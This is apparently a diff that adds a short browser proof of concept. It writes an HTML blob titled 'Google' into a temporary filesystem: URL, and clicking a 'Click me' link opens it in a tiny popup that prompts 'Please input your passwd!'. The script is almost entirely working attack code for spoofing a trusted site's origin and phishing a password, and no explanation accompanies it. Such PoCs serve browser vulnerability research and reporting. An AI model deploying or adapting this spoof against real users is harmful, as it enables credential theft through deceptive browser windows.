@@ -1,0 +1,21 @@
+<script>
+var spoof_fn = function () {
+        setTimeout("prompt('Please input your passwd!');close()","0");       };
+
+var badHTML = ['<body><title>Google</title><scr', 'ipt>(', spoof_fn, ')();</scri', 'pt>'];
+var mimeType = 'text/html';
+var blob = new Blob(badHTML, {type: mimeType});
+
+webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function (fs) {
+	fs.root.getFile('test.html', {create: true}, function (fileEntry) {
+	  fileEntry.createWriter(function (fileWriter) {
+    	    	fileWriter.write(blob);
+    })
+  });
+});
+
+function aa(){
+t=window.open("filesystem:https://fiddle.jshell.net/temporary/test.html","dd","width=1%,height=1%,top=200,left=550");
+}
+</script>
+<a href="http://www.google.com" target="d" onclick="setTimeout('aa()','500')">Click me</a>
